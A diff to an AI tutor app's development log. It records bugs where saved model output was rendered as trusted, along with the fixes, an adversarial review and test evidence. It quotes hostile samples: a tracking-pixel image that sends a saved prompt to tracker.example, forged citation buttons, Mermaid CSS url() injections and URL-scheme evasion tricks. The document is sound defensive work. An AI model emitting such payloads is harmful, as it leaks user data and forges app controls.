@@ -784,3 +784,191 @@ previous build when the hash moves. `audit:mermaid` renders a well-formed
 linked SVG through a stand-in Mermaid and fails when a link target
 survives. Removing either link check or the image override fails the unit
 tests.
+
+## Bugs reproduced on 2026-09-25: saved AI output trusted outside the tutor (#81)
+
+The security review of #69 named three paths where model text was trusted
+more than the tutor trusts it. Against main (3020ab0), with the new audits
+and a seeded probe:
+
+- Review rendered AI flashcards, and cards made from an AI clipping, through
+  the Reader's renderer. A seeded AI flashcard whose answer held
+  `<button class="ai-tutor__citation" data-ai-citation="S1">`, `<img
+  src="https://tracker.example/raw.png">`, `![Tracking
+  pixel](https://tracker.example/pixel.png?q=saved-prompt)` and a link to
+  `http://127.0.0.1:<port>/#/read/notes/…` rendered a real citation button,
+  two `<img>` elements and a live link into the app. The deck page sent 16
+  requests to tracker.example in 1.5 s. `audit:review` fails there with
+  "AI flashcard in the deck: saved AI text rendered an <img>".
+- "Create review card" on an AI clipping dropped its provenance: the card
+  got the answer text and only a `part-N` tag.
+- A Markdown image in a tutor answer rendered as an `<img>` and loaded
+  (`img-src https:`).
+- `[Open the app copy](http://127.0.0.1:<port>/#/read/…)` in a tutor answer
+  was a live link. `audit:ai-ui` fails with the links
+  `["http://127.0.0.1:58983/#/read/notes/…"]` where it expects only the image
+  link. The http(s) check also passed `[x](http:#/read/notes/x)`, which a
+  browser resolves against the page to an in-app route.
+
+The Notebook already showed a saved answer as plain React text; it stays
+that way and the audits now assert it.
+
+- The tutor's untrusted rules move to `src/lib/untrustedMarkdown.js`, which
+  does not import KaTeX. The tutor renderer adds citations, KaTeX and its
+  layout on top. `renderUntrustedMarkdown` applies the rules alone to saved
+  AI output; its `[S#]`/`[W#]` markers stay plain text because no evidence
+  travels with saved text.
+- A remote Markdown image renders as a link, "Image: alt (host)", that opens
+  in a new tab. Relative, `data:` and same-host images and images labelled
+  with a citation marker show their alt text. A linked image becomes the
+  link's text, so links never nest.
+- A link to the app's own host (any scheme or port, absolute or autolinked)
+  renders as its label. Kept links carry the normalized address, and
+  addresses with credentials render as text.
+- Review renders a card with the untrusted profile when it carries the
+  `ai-draft` tag or was made from an `ai-tutor` clipping: in the deck, review
+  sessions, interview rounds and the card dialog's preview. A card made from
+  an AI clipping gets `ai-draft` (first, so a tag limit cannot drop it), the
+  dialog says it is an AI draft, and an edit that clears the tags keeps it.
+  A card made from an AI clipping before this change gains the tag when the
+  profile loads (see the review follow-up below). Learner cards keep the
+  Reader renderer. No schema field was added.
+- No path opens saved AI text in the Reader: "Save to notes" writes a
+  clipping, whose button opens the cited lecture, and notes are created only
+  by the learner. The Reader is unchanged.
+
+Evidence:
+
+- Unit tests (`untrustedMarkdown.test.mjs`, `tutorMarkdown.test.mjs`,
+  `phoneTutorMarkdown.test.mjs`, `aiProvenance.test.mjs`) cover the hostile
+  saved answer, citation-looking links, images (remote, reference, linked,
+  relative, `data:`, same-host, in tables and structured fields, KaTeX
+  `\includegraphics`), same-host links (absolute, autolinked, other port,
+  numeric host, `http:#…`), the page-origin default, Markdown structure in
+  saved text, the Reader renderer still keeping author HTML and images, and
+  provenance through normalization, backup and a 40-tag card. Each of these
+  mutations fails at least one test: removing the image override, the
+  same-host check, the address normalization, the URL parse, the
+  citation-label check or the nested-image flattening; turning the html
+  tokenizers back on; dropping the clipping clause from the AI-card check;
+  appending `ai-draft` last.
+- `audit:ai-ui` saves a hostile answer to notes, makes a review card from
+  the clipping (checking the `ai-draft` tag, the AI note and the preview),
+  adds hostile AI flashcards to Review, and checks the tutor answer, the tutor
+  flashcard, the Notebook clipping and both deck cards: no `<img>`, no
+  control, no link to the app, the image as a link, the markup as text, and
+  no request to the image host.
+- `audit:review` seeds an AI flashcard, a pre-tag card from an AI clipping,
+  the clipping and a learner card in a fresh context, then checks the deck,
+  every card of a session, an interview round, both edit previews, that
+  clearing the tags keeps `ai-draft`, the Notebook clipping, a learner card's
+  `<kbd>`, and no request to the image host.
+- Both audits fail against main's app sources, as described above.
+- KaTeX `\includegraphics`, `\href` and `\htmlStyle` render no image, link
+  or style with trust off. Mermaid did fetch; see the review follow-up below.
+- Startup script: 712,278 bytes (main 711,759). Route screens beyond the
+  entry: 816,191 bytes (main 814,352).
+- Gate: `npm run check` passed (`audit:ai` 453/453). `npm run check:browser`
+  passed all 13 suites on the first attempt with no retries. One earlier
+  standalone `audit:review` run timed out waiting for the deck-import file
+  chooser, before the new section; the rerun and the gate passed.
+
+### Adversarial review of the #81 fix (2026-09-25)
+
+The review tried to get model HTML, forged controls, remote fetches or
+same-origin navigation through every storage and render path: save to notes
+and the Notebook clipping, a backup round trip, a `lumen.cards.v1` export and
+import, sync merge, clipping-note edits, the card dialog preview, AI
+flashcard answers, mistakes and corrective cards, protocol tricks (`HTTP:`,
+`//`, `http:\\`, `http:/`, `http:host`, entity-encoded schemes, spaces,
+tabs, user info, trailing dots, numeric and hex IPv4 forms, ports, `[::1]`,
+`xn--` names), `<picture>`/`srcset`, CSS `url()` in `style`, and KaTeX
+`\href`, `\url`, `\includegraphics`, `\htmlStyle` and `\color{url(…)}`. The
+Markdown renderer held: all of these came out as text, as a normalized
+external link, or as a KaTeX error in a `title`. Two defects remained.
+
+- **Mermaid diagrams in tutor answers fetched remote resources.** The first
+  version of this fix recorded that Chrome sent no request for a `themeCSS`
+  `url()`; that was wrong. A probe that rendered
+  tutor answers through `renderTutorMarkdown` and `useMermaidDiagrams` in
+  Chrome recorded requests to tracker.example from:
+  - a `%%{init: {"fontFamily": "x;background-image:url(…)"}}%%` directive;
+  - `themeCSS` with selectors (`rect{background-image:url(…)}`);
+  - a frontmatter `config: fontFamily`;
+  - an `htmlLabels: true` directive with an `<img>` label (loaded while
+    Mermaid measured it; the SVG filter removes `foreignObject` only
+    afterwards);
+  - a flowchart node's `@{ img: "…" }` (Mermaid preloads it with
+    `new Image()`);
+  - a sequence actor's `properties` `icon`;
+  - a `stateDiagram-v2` `classDef … mask-image:url(…)`.
+
+  Flowchart `style`/`classDef` lines with `url()` fail to parse; state
+  diagram `classDef` lines do not. A directive without an address could
+  still restyle the diagram: `fontFamily: "x;position:fixed;…"` reaches the
+  SVG's `<style>`, and `htmlLabels` loads a same-origin `<img>`.
+- **Pre-#81 cards made from AI clippings lost provenance.** Such a card was
+  recognized only through its clipping id. A card export (which carries
+  tags but not `sourceClippingId`), a mistake it logged (and the corrective
+  card made from it after the card was deleted), or deleting the clipping
+  all left AI text rendering as trusted.
+
+Fixes:
+
+- The untrusted profile marks a model diagram with
+  `data-diagram-author="model"`. For such a diagram, `renderMermaidDiagrams`
+  calls `mermaid.initialize` with every top-level config key in `secure`.
+  Mermaid then drops each directive and frontmatter `config:` key before
+  applying it, so the site's font, `htmlLabels: false` and theme stay. A
+  model diagram whose source, after numeric entities (`&#58;`, Mermaid's
+  `#58;`) are decoded and tabs and line breaks removed, contains a web
+  scheme, `//`, a backslash (YAML, JSON and CSS escapes all need one),
+  `url(`, `image-set` or `@import` is shown as a `mermaid` code block. A
+  marked diagram that reaches Mermaid without passing through the profile
+  fails with "Diagram not drawn". Learner diagrams in the Reader keep their
+  directives.
+- The profile normalizer adds `ai-draft` (first, within the 30-tag limit)
+  to a card whose `sourceClippingId` names an `ai-tutor` clipping.
+  Normalizing again changes nothing, and sync normalizes base, local and
+  remote alike, so the backfill does not look like an edit.
+
+Evidence:
+
+- `audit:mermaid` has a `resources` fixture. It renders nine address-naming
+  tutor diagrams (including a YAML-escaped `"i\x6dg"` key and a CSS-escaped
+  `u\72l(…)`), a saved-AI diagram, three directive-only tutor diagrams
+  (overlay font, `htmlLabels` with a same-origin `<img>`, red `themeCSS`
+  fill), a learner diagram with the same red fill, and marked model markup.
+  It asserts no request to tracker.example, no same-origin label request,
+  ten code blocks and no drawn diagram for the address-naming ones, no red
+  fill, `position: fixed` or HTML label in the directive diagrams, the site
+  font, a red fill in the learner diagram and "Diagram not drawn" for the
+  marked markup. Against the branch's previous renderer and Mermaid module
+  (the same as main for Mermaid) it fails with 11 requests: `/font-family`,
+  `/theme-css`, `/frontmatter`, `/html-label`, `/shape-image`,
+  `/actor-icon`, `/class-def`, `/yaml-escape`, `/css-escape`,
+  `/saved-shape`, `/marked-markup`. With only the config lock removed, it
+  fails with the same-origin label request.
+- Unit tests cover the address check in 13 spellings and 4 ordinary
+  diagrams, the locked config, model fences shown as code in the saved-AI
+  and tutor renderers, the model marker, and Reader diagrams staying
+  unmarked and drawn. Each of 10 mutations fails at least one test: the
+  renderer ignoring the check, backslash, decimal or hex entity decoding,
+  tab removal or schemes dropped from the check, the model marker dropped,
+  the config not locked, Mermaid's default keys ignored, and the code
+  fallback ignored.
+- `aiProvenance.test.mjs` normalizes a pre-#81 card, a 30-tag one, a learner
+  clipping's card and an unlinked card. It then deletes the clipping,
+  exports and imports the deck, and logs a mistake that makes a corrective
+  card. The backfill fails the test when it is removed or when it appends
+  the tag last. `audit:review` asserts that the seeded pre-#81 card shows
+  `ai-draft` in the deck before any edit.
+- Kept as they are: a `lumen.cards.v1` file is learner-chosen content, like
+  an uploaded note, so its cards render with the Reader renderer unless they
+  carry `ai-draft`. Exported AI cards keep the tag (first, within the
+  importer's 10-tag limit). `[W#]` citation links come from fetched search
+  evidence, not model text.
+- Startup script: 713,759 bytes (budget 750,000). Route screens beyond the
+  entry: 816,282 bytes.
+- Gate: `npm run check` passed (`audit:ai` 459/459). `npm run check:browser`
+  passed all 13 suites on the first attempt with no retries.
